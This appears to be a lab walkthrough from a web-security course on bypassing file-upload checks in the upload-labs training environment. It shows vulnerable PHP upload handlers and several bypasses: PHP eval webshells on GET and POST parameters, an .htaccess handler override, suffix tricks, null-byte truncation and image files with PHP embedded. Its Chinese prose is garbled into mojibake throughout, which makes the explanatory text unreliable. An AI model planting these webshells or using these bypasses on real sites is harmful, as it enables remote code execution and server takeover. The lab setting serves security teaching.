---
slug: /net-security/08/01
---

## æ¦‚å¿µ

æ–‡ä»¶ä¸Šä¼ æ˜¯å¸¸ç”¨åŠŸèƒ½ï¼Œä½†æ¶æ„æ–‡ä»¶çš„ä¸Šä¼ ä¼šå½¢æˆæ¼æ´ã€‚

ä¸»è¦å½¢æˆæ˜¯ï¼šåç«¯æ¥å—äº†æ¶æ„æ–‡ä»¶ä¸Šä¼ å¹¶ä¿å­˜ï¼Œå—å®³è€…è®¿é—®è¯¥æ¶æ„æ–‡ä»¶æ—¶ï¼Œå…¶ä¸­çš„æ¶æ„ä»£ç è¢« Web å®¹å™¨æ‰§è¡Œã€‚

<br />

å¸¸è§åœºæ™¯ï¼š

1. ä¸Šä¼ å¤´åƒ ğŸ‘¤

2. ä¸Šä¼ ç›¸å†Œ ğŸ“š

3. ä¸Šä¼ é™„ä»¶ ğŸ“

4. æ·»åŠ æ–‡ç« å›¾ç‰‡ 

5. å‰å°ç•™è¨€èµ„æ–™ä¸Šä¼ 

6. ç¼–è¾‘å™¨æ–‡ä»¶ä¸Šä¼ 

7. ###### â€¦â€¦

<br />

å®‰è£…é¶åœº

```bash
docker pull cuer/upload-labs
docker run -d -p 8082:80 --name upload-labs cuer/upload-labs
```



## å®¢æˆ·ç«¯ - JS ç»•è¿‡

### ç¦ç”¨ JavaScript

æ‰“å¼€é¶åœºçš„ pass01ï¼Œç‚¹å‡»å³ä¸Šè§’ã€ŒæŸ¥çœ‹æºç ã€ï¼Œè¿™é‡Œçš„æ–‡ä»¶ä¸Šä¼ å­˜åœ¨ JS é™åˆ¶ï¼Œå¹¶ä¸”åªå…è®¸ `.jpg`, `.png`, `.gif`

```php
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!");
        return false;
    }
    //å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹
    var allow_ext = ".jpg|.png|.gif";
    //æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹
    var ext_name = file.substring(file.lastIndexOf("."));
    //åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ 
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ " + allow_ext + "ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š" + ext_name;
        alert(errMsg);
        return false;
    }
}
```

åœ¨ä¸Šä¼ å‰å…ˆç¦ç”¨æ‰ JavaScript

![](http://img.wukaipeng.com/2023/1017-075949-image-20231017075948931.png)

é¦–å…ˆæˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶ `info.php`ï¼Œå†…å®¹æ˜¯è¾“å‡º php ä¿¡æ¯ï¼š

```php
<?php phpinfo(); ?>
```

![](http://img.wukaipeng.com/2023/10/19-070309-image-20231019070309633.png)æˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸Šä¼  `get.php`ï¼Œç›´æ¥ç”¨å‚æ•°æ§åˆ¶è¾“å‡º

```php
<?php eval(@$_GET['cmd']); ?>
```

![](http://img.wukaipeng.com/2023/10/19-071303-image-20231019071303290.png)

### ä¿®æ”¹åç¼€å

å…ˆæŠŠ `get.php` ä¿®æ”¹ä¸ºç¬¦åˆä¸Šä¼ è¦æ±‚ ğŸ‘‰ `get.png`ï¼Œç„¶åç”¨ Burp æŠ“åŒ…æ”¹å›åŸæ¥çš„ `get.php`

![](http://img.wukaipeng.com/2023/10/19-071741-image-20231019071740872.png)



### ä¿®æ”¹å‰ç«¯ä»£ç 

åˆ é™¤ `onsubmit` æ–¹æ³•ï¼Œè¿™ç§æ–¹å¼ä»…åœ¨ FireFox ç”Ÿæ•ˆï¼š

![](http://img.wukaipeng.com/2023/10/19-072230-image-20231019072230409.png)

## æœåŠ¡ç«¯ - é»‘åå•ç»•è¿‡

### ç‰¹æ®Šåç¼€

åœ¨ pass03ï¼Œè¿™é‡Œåç«¯æ— æ³•ä¸Šä¼ çš„é»‘åå•åŒ…æ‹¬ `.asp`, `.aspx`, `.php`, `.jsp`ã€‚



```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
        $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        } else {
            $msg = 'ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼';
        }
    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
```

å¯ä»¥ä½¿ç”¨å…¶ä»–åç¼€ï¼Œæ¯”å¦‚ï¼š`.phtml`, `.phps`, `php5`, `.pht`

> è¿™äº›åç¼€æ–‡ä»¶éœ€è¦è¢«æ‰§è¡Œçš„è¯æœ‰å‰ææ¡ä»¶æ˜¯ï¼Œ Apache éœ€è¦åšä¸€äº›é…ç½®ä»£ç 

### å¤§å°å†™ç»•è¿‡

åœ¨ pass06ï¼Œä¸Šä¼  `get.PHP` å°±èƒ½ç»•è¿‡

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        } else {
            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';
        }
    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
```

### ç‚¹ç»•è¿‡

åœ¨ pass08ï¼Œä¸Šä¼  `get.php.` å¯ä»¥ç»•è¿‡

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        } else {
            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';
        }
    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
```

### ç©ºæ ¼ç»•è¿‡

åœ¨ pass07 ä¸­ï¼Œå¯ä»¥åœ¨æ–‡ä»¶æœ«å°¾æ·»åŠ ç©ºæ ¼ `get.php ` ç»•è¿‡ã€‚

ç©ºæ ¼ç»•è¿‡è¿™ç§æ–¹å¼ä»…é€‚ç”¨äº Windows ç³»ç»Ÿï¼Œå› ä¸º Windows ä¼šå»é™¤æ–‡ä»¶å‰åç©ºæ ¼ï¼Œæ‰èƒ½è®¿é—®å¾—åˆ°ã€‚

### `::data` ç»•è¿‡

Windows ä¸­ï¼Œå¦‚æœ æ–‡ä»¶å + `::$DATA` ä¼šæŠŠ `::$DATA` ä¹‹åçš„æ•°æ®å½“åšæ–‡ä»¶æµå¤„ç†ï¼Œä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒ `::$DATA` ä¹‹å‰çš„æ–‡ä»¶åã€‚ä½¿ç”¨ã€‚

åœ¨ pass08 ä¸­å¯ä½¿ç”¨

![](http://img.wukaipeng.com/2023/10/21-163600-image-20231021163559755.png)

ä¸è¿‡ç”±äº Linux æ— æ³•è§£æ `http://175.178.126.31:8082/upload/get.php::data`ï¼Œè®¿é—®ä¸åˆ°ï¼Œä½†æ˜¯æ–‡ä»¶æ˜¯å·²ç»ä¸Šä¼ äº†ã€‚



### é…åˆè§£æç»•è¿‡

åœ¨ pass10 ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ä»£ç å¾ˆä¸¥æ ¼ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªæ¼æ´å°±æ˜¯åªåšäº†ä¸€æ¬¡æ ¡éªŒï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¸Šä¼ æ³¨å…¥ `get.php. .` æ¥è¿›è¡Œç»•è¿‡ã€‚

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA
        $file_ext = trim($file_ext); //é¦–å°¾å»ç©º
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = 'ä¸Šä¼ å‡ºé”™ï¼';
            }
        } else {
            $msg = 'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼';
        }
    } else {
        $msg = UPLOAD_PATH . 'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼';
    }
}
```



.htaccess ç»•è¿‡

`.htaccess` æ–‡ä»¶ï¼Œï¼ˆHypertex Accessè¶…æ–‡æœ¬ï¼‰å…¥å£æ˜¯ Apache çš„é…ç½®æ–‡ä»¶ï¼Œç”¨äºæ‰§è¡Œç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚

åœ¨ Upload-04 ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼  `.htaccess` æ–‡ä»¶

å‡†å¤‡ä¸¤ä¸ªæ–‡ä»¶ `.htaccess` å’Œ `wukaipeng.png`ï¼š

```xml
<!-- .htaccessæ–‡ä»¶ -->
<FilesMatch "wukaipeng.jpg">
Sethandler application/x-httpd-php
</FilesMatch>
```

```php
/* wukaipeng.png */
<?php eval(@$_POST['cmd']); ?>
```



ç„¶ååˆ†åˆ«ä¸Šä¼ ï¼Œä¹‹ååœ¨èšå‰‘æµ‹è¯•é“¾æ¥

![](http://img.wukaipeng.com/2023/10/21-171404-image-20231021171404530.png)



### åŒå†™ç»•è¿‡

åœ¨ pass11 ä¸­ï¼Œå¯ä»¥åˆ©ç”¨åŒå†™åç¼€ç»•è¿‡ï¼Œæ¯”å¦‚ `info.php` ğŸ‘‰ `info.pphphp`



## æœåŠ¡ç«¯ - ç™½åå•ç»•è¿‡

### MIME ç±»å‹ç»•è¿‡

åœ¨ pass02 ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ `Content-Type` æ¥ç»•è¿‡

![](http://img.wukaipeng.com/2023/10/22-091351-image-20231022091351272.png)

### 00 æˆªæ–­ç»•è¿‡

00 æˆªæ–­ç»•è¿‡æ˜¯ç³»ç»Ÿæ¼æ´ï¼Œæ“ä½œç³»ç»Ÿåº•å±‚æ˜¯ C è¯­è¨€ or æ±‡ç¼–è¯­è¨€çš„ï¼Œè¿™ä¸¤ç§è¯­è¨€éƒ½ä»¥ `\0` ä½œä¸ºå­—ç¬¦ä¸²çš„ç»“æŸæ ‡å¿—ã€‚00 æˆªæ–­æ˜¯æŒ‡æ’å…¥ `\0`ï¼Œä»è€Œè¾¾åˆ°å­—ç¬¦ä¸²æˆªæ–­çš„ç›®çš„ã€‚

`\0` æ˜¯ ASCII ç è¡¨ä¸­çš„ç¬¬ 0 ä¸ªå­—ç¬¦ï¼Œè‹±æ–‡åä¸º `NUL`ã€‚`\0` æ˜¯åœ¨åº•å±‚æ“ä½œç³»ç»Ÿçš„è¡¨ç°å½¢å¼ï¼Œåœ¨å‰ç«¯è¾“å…¥ä¸èƒ½ç›´æ¥è¾“å…¥ `\0`ï¼Œè€Œåº”è¯¥ä½¿ç”¨ `%00` æˆ–è€… `0x00`ï¼š

`%00`ï¼šURL ä¸­ `%00` è¡¨ç¤º ASCII ç ä¸º `0` çš„å­—ç¬¦ï¼Œè¯¥å­—ç¬¦ä¸ºç‰¹æ®Šå­—ç¬¦ä¿ç•™ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸²ç»“æŸã€‚å½“ URL å‡ºç° `%00` æ—¶å°±è®¤ä¸ºè¯»å–å·²ç»ç»“æŸï¼Œè€Œå¿½ç•¥åé¢ä¸Šä¼ çš„æ–‡ä»¶æˆ–å›¾ç‰‡ï¼Œåªä¸Šä¼ æˆªæ–­å‰çš„æ–‡ä»¶ã€‚

`0x00`ï¼š`%00` è§£ç æˆåå…­è¿›åˆ¶å½¢å¼ã€‚

æ¥ç€æˆ‘ä»¬è¦å®‰è£…å°çš®é¢æ¿ä½œä¸ºè¿™æ¬¡å®éªŒçš„ç¯å¢ƒï¼Œå°çš®é¢æ¿å¯¹ä¸»æœºçš„ä¾µå…¥æ€§è¿˜æ˜¯è›®å¤§çš„ï¼Œæˆ‘è¯•è¿‡åœ¨ä¸€å°è¿œç¨‹ Linux æœåŠ¡å™¨å®‰è£…ï¼Œä¸ä»…æ²¡è·‘èµ·æ¥ï¼Œè€Œä¸”è¿˜æŠŠç¯å¢ƒç»™æ±¡æŸ“äº†ï¼Œæ— å¥ˆåªèƒ½ç»™æœåŠ¡å™¨é‡è£…ç³»ç»Ÿã€‚æ‰€ä»¥è¿˜æ˜¯åœ¨è™šæ‹Ÿæœºç¯å¢ƒè·‘å°çš®é¢æ¿ï¼Œå®‰å…¨éš”ç¦»ï¼Œè¿™æ˜¯å®‰è£…æ•™ç¨‹ ğŸ‘‰ [02-Mac M1M2 å®‰è£… Windows11 && å°çš®é¢æ¿ PhpStudy](https://wukaipeng.com/technique/net-security/08/02)

å®‰è£…å¥½ä¹‹åï¼Œæˆ‘ä»¬æ‰“å¼€ Windows ä¸­çš„å°çš®é¢æ¿ PhpStudyï¼Œåˆ‡æ¢ä¸€ä¸ªä½çš„ PHP ç‰ˆæœ¬ï¼š

![](http://img.wukaipeng.com/2023/10/26-061912-image-20231026061912180.png)

å…³é—­ `magic_quotes_gpc`

![](http://img.wukaipeng.com/2023/10/26-062137-image-20231026062136850.png)

é‡å¯ PhpStudyã€‚

ç„¶åæˆ‘ä»¬å‡†å¤‡ä¸€ä¸ªæ–‡ä»¶ `post.php`ï¼Œå†…å®¹ä¸ºï¼š

```php
<?php eval(@$_POST['cmd']); ?>
```

å°† `post.php` åç¼€æ”¹ä¸º `.png`ï¼Œç„¶åæ‰“å¼€ upload-labs ä¸Šä¼ ï¼Œç”¨ Burp æ‹¦æˆªï¼Œä¿®æ”¹ `save_path`ï¼š

![image-20231026071654942](http://img.wukaipeng.com/2023/10/26-071655-image-20231026071654942.png)

> å¦‚æœå¤±è´¥çš„è¯å¯ä»¥çœ‹ä¸€ä¸‹æ˜¯å¦è¢« Windows11 çš„â€œç—…æ¯’å’Œå¨èƒé˜²æŠ¤â€æ‹¦æˆªäº†ã€‚

ä¸Šä¼ åæˆ‘ä»¬ä¼šè·å¾—è¿™æ ·çš„å›¾ç‰‡ URLï¼š`http://172.16.26.128/upload-labs/upload/post.php%EF%BF%BD/6320231026071713.png`

å°† `post.php` åé¢å»æ‰ï¼Œç„¶ååœ¨èšå‰‘ä¸Šè¿›è¡Œè¿æ¥ï¼š

![](http://img.wukaipeng.com/2023/10/26-071834-image-20231026071834534.png)



## æœåŠ¡ç«¯ - å†…å®¹ç»•è¿‡

### æ–‡ä»¶å¤´æ£€æŸ¥

ä¸‹é¢æ–‡ä»¶å¤´çš„æ ¼å¼æ˜¯åå…­è¿›åˆ¶ï¼š

- .jpg:  `FF D8 FF E0 00 10 4A 46 49 46`
- .gif: `47 49 46 38 39 61`
- .png: `89 50 4E 47`

Mac ä¸‹ä½¿ç”¨ Hex Friendï¼ˆ[http://hexfiend.com/](http://hexfiend.com/)ï¼‰ æŸ¥çœ‹ä¸€å¼  png çš„åå…­è¿›åˆ¶ï¼š

![](http://img.wukaipeng.com/2023/10/23-065115-image-20231023065115774.png)

ğŸ´ åˆ¶ä½œ**å›¾ç‰‡é©¬**ï¼š

åœ¨ Hex Friend ä¸­æ‰“å¼€ä¸€å¼ çœŸå®å›¾ç‰‡ï¼Œåœ¨æœ€ååŠ ä¸Šä¸€å¥è¯æœ¨é©¬

```php
<?php phpinfo(); ?>
```

![](http://img.wukaipeng.com/2023/10/24-071627-image-20231024071626901.png)

åœ¨ pass13 ä¸Šä¼ å›¾ç‰‡ï¼Œå¹¶è·å–å›¾ç‰‡çš„ URL

![](http://img.wukaipeng.com/2023/10/24-064724-image-20231024064723166.png)

è®¿é—®ï¼š`http://YOUR_IP_ADDRESS:PORT/include.php?file=IMAGE_URL`

![](http://img.wukaipeng.com/2023/10/24-065910-image-20231024065909868.png)

ğŸ´ åˆ¶ä½œå›¾ç‰‡é©¬çš„å¦å¤–ä¸€ç§æ–¹å¼ï¼šç›´æ¥è®¾ç½®æ–‡ä»¶å¤´ï¼Œç„¶åå†™ä¸Šä¸€å¥è¯æœ¨é©¬

> è¿™ç§æ–¹å¼ä¸¥æ ¼ä¸Šä¸ç®—å›¾ç‰‡é©¬



### çªç ´ getimagesize åŠ exif_imagetype

åœ¨ pass15 ä¸­ï¼Œå’Œæ–‡ä»¶å¤´æ£€æŸ¥ä¸ä¸€æ ·ï¼Œåˆ¤æ–­æ–‡ä»¶ä»£ç æ˜¯ç”¨ `getimagesize()` åˆ¤æ–­å›¾ç‰‡ï¼Œå³è·å–å›¾ç‰‡çš„é•¿åº¦å’Œé«˜åº¦ç­‰æ¥åˆ¤æ–­æ˜¯å¦æ˜¯å›¾ç‰‡ã€‚

åœ¨ pass16 ä¸­ï¼Œ`exif_imagetype()` è¯»å–ç¬¬ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚

å¯¹äº pass15 å’Œ pass16ï¼Œæˆ‘ä»¬åªéœ€è¦ç”¨çœŸå®çš„å›¾ç‰‡æ¥åˆ¶ä½œæœ¨é©¬ï¼Œå¹¶ä¸”æ”»å‡»æ–¹å¼å’Œä¸Šä¸€å°èŠ‚ä¸€è‡´ï¼Œè¿™é‡Œå¿½ç•¥ã€‚



### äºŒæ¬¡æ¸²æŸ“ç»•è¿‡

**äºŒæ¬¡æ¸²æŸ“**ï¼šå°†ç”¨æˆ·ä¸Šä¼ çš„ç…§ç‰‡è¿›è¡Œä¿®æ”¹ï¼Œæ–°ç”Ÿæˆçš„å›¾ç‰‡å†ç¥¨å¦‚æ•°æ®åº“ã€‚æ¯”å¦‚ä¸Šä¼ å¤´åƒï¼Œç½‘ç«™æ ¹æ®å¤´åƒç”Ÿæˆä¸åŒå°ºå¯¸çš„å¤´åƒã€‚

åœ¨ pass-17 ä¸­ï¼Œä¼šåˆ¤æ–­åç¼€åã€æ–‡ä»¶ç±»å‹ï¼Œåˆ©ç”¨ `imagecreatefrom<jpeg|png|gif>()` åˆ¤æ–­æ˜¯å¦æ˜¯å›¾ç‰‡æ ¼ï¼Œæœ€åå†åšäºŒæ¬¡æ¸²æŸ“ã€‚

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å
    $fileext= substr(strrchr($filename,"."),1);

    //åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œ
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path)){
            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼";
                @unlink($target_path);
            }else{
                //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å
                srand(time());
                $newfilename = strval(rand()).".jpg";
                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "ä¸Šä¼ å‡ºé”™ï¼";
        }

    }else if(($fileext == "png") && ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path)){
            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = "è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼";
                @unlink($target_path);
            }else{
                 //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å
                srand(time());
                $newfilename = strval(rand()).".png";
                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagepng($im,$img_path);

                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = "ä¸Šä¼ å‡ºé”™ï¼";
        }

    }else if(($fileext == "gif") && ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path)){
            //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = "è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼";
                @unlink($target_path);
            }else{
                //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å
                srand(time());
                $newfilename = strval(rand()).".gif";
                //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagegif($im,$img_path);

                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "ä¸Šä¼ å‡ºé”™ï¼";
        }
    }else{
        $msg = "åªå…è®¸ä¸Šä¼ åç¼€ä¸º.jpg|.png|.gifçš„å›¾ç‰‡æ–‡ä»¶ï¼";
    }
}
```

æˆ‘ä»¬ä»¥è¿™å¼  GIF ä¸ºä¾‹

![free freedom](http://img.wukaipeng.com/2023/10/25-065436-free%20freedom.gif)

å…ˆç”¨ Hex Friend æ‰“å¼€ï¼Œåœ¨å°¾éƒ¨æ·»åŠ ä¸€å¥è¯æœ¨é©¬ `<?php phpinfo(); ?>`ï¼š

![](http://img.wukaipeng.com/2023/10/25-065615-image-20231025065614989.png)

æˆ‘ä»¬ä¸‹è½½ä¸Šä¼ åçš„å›¾ç‰‡ï¼Œä¹Ÿç”¨ Hex  Friend æ‰“å¼€ï¼Œå¯ä»¥çœ‹ä¸‹æœ«å°¾ï¼Œä¸€å¥è¯æœ¨é©¬å·²ç»è¢«åˆ é™¤æ‰äº†ã€‚æ¥ç€æˆ‘ä»¬ä½¿ç”¨ Hex Friend çš„å¯¹æ¯”åŠŸèƒ½ï¼š

![](http://img.wukaipeng.com/2023/10/25-065749-image-20231025065748851.png)



åœ¨æŸ¥çœ‹å¯¹æ¯”çš„æ—¶å€™ï¼Œå¯ä»¥çœ‹åˆ°åªæœ‰åé¢å¤§éƒ¨åˆ†åŸºæœ¬å…¨éƒ¨è¢«æ”¹åŠ¨è¿‡ï¼Œåªæœ‰å‰é¢éƒ¨åˆ†æ”¹åŠ¨æ¯”è¾ƒå°ï¼š

![](http://img.wukaipeng.com/2023/10/25-065930-image-20231025065930441.png)

![](http://img.wukaipeng.com/2023/10/25-070029-image-20231025070029644.png)

å› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨å‰é¢éƒ¨åˆ†æ’å…¥ä¸€å¥è¯æœ¨é©¬ï¼š

![](http://img.wukaipeng.com/2023/10/25-070316-image-20231025070316462.png)

ç„¶åé‡æ–°ä¸Šä¼ ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬å·²ç»æ³¨å…¥æˆåŠŸäº†ã€‚

> å¦‚æœæ²¡æœ‰æˆåŠŸçš„è¯ï¼Œè¦å¤šè¯•å‡ æ¬¡
>
> éœ€è¦æˆ‘è¿™ä¸€å¼ æ’å…¥æœ¨é©¬æˆåŠŸçš„ GIF å›¾ï¼Œå¯ä»¥ä»è¿™ä¸ªåœ°å€ä¸‹è½½ï¼š[â¬‡ï¸ freedom gif](https://github.com/Penggeor/NetSecurity/blob/main/%E7%AC%AC%2009%20%E5%91%A8/%E8%AF%BE%E4%BB%B6/free%20freedom%20copy.gif) 

![](http://img.wukaipeng.com/2023/10/25-070405-image-20231025070404857.png)



### æ–‡ä»¶åŒ…å«ç»•è¿‡



## æœåŠ¡ç«¯ - ä»£ç é€»è¾‘ï¼ˆæ¡ä»¶ç«äº‰ï¼‰

